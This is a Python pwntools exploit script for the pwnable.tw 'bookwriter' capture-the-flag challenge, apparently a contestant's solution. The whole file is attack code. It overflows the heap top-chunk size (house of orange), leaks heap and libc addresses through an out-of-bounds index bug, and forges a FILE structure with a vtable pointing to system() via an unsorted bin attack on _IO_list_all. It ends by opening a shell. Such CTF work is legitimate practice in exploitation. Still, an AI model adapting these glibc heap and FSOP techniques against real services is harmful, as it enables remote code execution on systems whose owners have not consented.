from pwn import *
import sys


elf = ELF('bookwriter')
if sys.argv[1] == 'r':
    p = remote('chall.pwnable.tw', 10304)
    libc = ELF('libc_64.so.6')
elif sys.argv[1] == 'l':
    p = process('./bookwriter_local', env={"LD_PRELOAD":"libc.so.6"}, aslr=True)
    libc = ELF('libc.so.6')
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc.pidof(p)[0], gdbscript='''
                                        continue
                                        ''')

def register(name):
    p.sendlineafter("Author :", name)

def add_page(size, content):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("Size of page :", str(size))
    if size != 0:
        p.sendafter("Content :", content)

def view_page(index):
    p.sendlineafter("Your choice :", "2")
    p.sendlineafter("Index of page :", str(index))

def edit_page(index, content):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index of page :", str(index))
    p.sendafter("Content:", content)

def solve():
    register("a"*0x40) 
    add_page(0x18, "A"*0x18)            
    edit_page(0, 'A'*0x18)              # list_size[0] = 0x1b
    
    edit_page(0, '\x00'*0x18 + '\xe1' + '\x0f' + '\x00')        # overflow size of top_chunk to 0xfe0 to setup house of orange

    p.sendlineafter("Your choice :", "4")
    heap_base = u64(p.recvuntil("(yes:1 / no:0) ")[0x49:0x4d].ljust(8, '\0'))
    log.info("heap base: %s" %hex(heap_base)) 
    p.sendline("0")                 # function info call scanf => malloc (0x1000) in heap => house of orange
    for i in range(7):
        add_page(0x58,'A'*0x8)    
    add_page(0x18, 'B'*8)           # in function add_page, out-of-bound check vuln in index => list_page[8] = list_size[0] => overwrite size of page[0] to address of page[8]

    # leak libc
    view_page(2)
    p.recvuntil("AAAAAAAA")
    libc.address = u64(p.recvuntil('----------------------')[:0x6] + '\x00\x00') - 0x3c3b78
    binsh = next(libc.search('/bin/sh\x00'))
    system = libc.symbols['system']
    io_list_all = libc.symbols['_IO_list_all']
    success("libc address: %s" %hex(libc.address))
    success("system:       %s" %hex(system))
    success("binsh:        %s" %hex(binsh))
    success("io_list_all:  %s" %hex(io_list_all))


    # fsop
    vtable_addr = heap_base + 0x3d8 - 0x10
    success("vtable_addr:  %s" %hex(vtable_addr))

    fake_stream = '/bin/sh\x00' + p64(0x61)
    fake_stream += p64(0xdeadc0de) + p64(io_list_all - 0x10) # unsorted bin attack
    fake_stream += p64(0) + p64(1)
    fake_stream = fake_stream.ljust(0xc0, '\x00')
    fake_stream += p64(0)

    payload  = '\x00'*0x2d0
    payload += fake_stream
    payload += p64(0)*2

    payload += p64(vtable_addr)
    payload += p64(1)
    payload += p64(2)    
    payload += p64(3)    
    payload += p64(0)*3
    payload += p64(system)

    edit_page(0, payload)

    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Size of page :', '10')  
    p.interactive()

if __name__ == '__main__':
    solve()

